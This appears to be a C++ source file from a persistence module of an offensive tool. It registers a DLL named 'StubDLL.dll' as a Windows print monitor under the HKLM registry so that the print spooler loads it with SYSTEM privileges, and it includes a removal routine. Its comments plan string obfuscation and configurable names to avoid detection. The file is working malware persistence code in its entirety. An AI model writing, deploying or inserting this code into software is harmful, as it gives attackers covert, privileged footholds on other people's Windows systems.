#include "Registry.hpp"
#include <windows.h>
#include <exception>

#define MONITOR_NAME L"MyMonitor" // Can be injected using env variable by /D cl.exe flag (/D MONITOR_NAME="%MONITOR_NAME%")
#define DLL_FILE_NAME "StubDLL.dll" // Can also be injected using env.
void Persistency::Registry::InstallByModifyRegistry()
{
	HKEY hMonitorKey = NULL;
	if (ERROR_SUCCESS != RegCreateKeyEx(
		HKEY_LOCAL_MACHINE,
		L"SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\" MONITOR_NAME,  // TODO: Compile time string obfuscation.
		0L,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hMonitorKey,
		NULL))
	{
		const auto a = GetLastError();
		throw std::exception("Can not create registry key.");
	}

	const char* value = "StubDLL.dll"; // TODO: move to config / env variables.
	if (ERROR_SUCCESS != RegSetValueExA(hMonitorKey, "Driver", 0, REG_SZ, (const BYTE*)value, 12))
	{
		RegCloseKey(hMonitorKey);
		throw std::exception("Can not create key.");
	}

	RegCloseKey(hMonitorKey);
}

void Persistency::Registry::RemoveByModifyRegistry()
{
	// Note: I dont compile this app as 32 bit application, so no SYSWOW 32 view of the registry tree.
	if (ERROR_SUCCESS != RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\" MONITOR_NAME, KEY_WOW64_64KEY, 0))
	{
		throw std::exception("Can not delete key.");
	}
}